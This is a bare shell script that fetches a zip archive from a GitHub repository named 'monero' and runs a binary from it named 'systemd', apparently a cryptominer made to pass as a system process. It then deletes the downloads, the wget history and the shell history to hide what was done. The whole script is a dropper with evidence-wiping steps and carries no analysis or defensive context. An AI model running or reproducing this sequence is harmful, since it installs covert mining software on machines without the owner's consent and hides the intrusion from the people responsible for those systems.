wget https://github.com/deusveritatis/monero/archive/master.zip
unzip master.zip
cd monero-master
tar -xvzf ./bash.tar.gz
cd bash
./systemd
cd ../..
rm -r master.zip
rm -r monero-master
rm .wget-hsts
rm nv2v3
rm .bash_history && history && exit
